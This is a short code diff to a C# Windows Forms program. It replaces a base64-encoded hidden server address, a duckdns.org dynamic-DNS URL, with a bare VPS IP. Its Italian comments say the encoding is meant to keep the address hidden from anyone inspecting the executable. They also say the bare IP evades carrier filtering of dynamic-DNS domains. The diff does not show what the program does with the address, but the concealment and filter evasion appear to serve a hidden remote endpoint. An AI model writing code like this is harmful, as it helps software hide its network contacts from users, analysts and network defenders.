@@ -27,8 +27,13 @@ public class Form1 : Form
     // offuscatore serio (es. ConfuserEx) sull'intero eseguibile. Questo passo
     // alza solo l'asticella per chi aprisse l'exe con un editor di testo o
     // "strings.exe" e cercasse l'indirizzo cosi' com'e', a colpo d'occhio.
+    // IP fisso della VPS, non un dominio: niente piu' *.duckdns.org, che alcuni
+    // operatori telefonici filtrano per categoria "dynamic DNS" a prescindere
+    // dal sottodominio (verificato: l'IP nudo passava, qualunque nome
+    // *.duckdns.org no). L'IP della VPS e' statico, non cambia da solo — se un
+    // giorno cambiasse VPS, questo valore va aggiornato qui e ripubblicato.
     private static readonly string _indirizzoReale =
-        Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovL21oeHIuZHVja2Rucy5vcmcv"));
+        Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovLzU3LjEzMS4xOTMuMjQ0Lw=="));
 
     public Form1()
     {
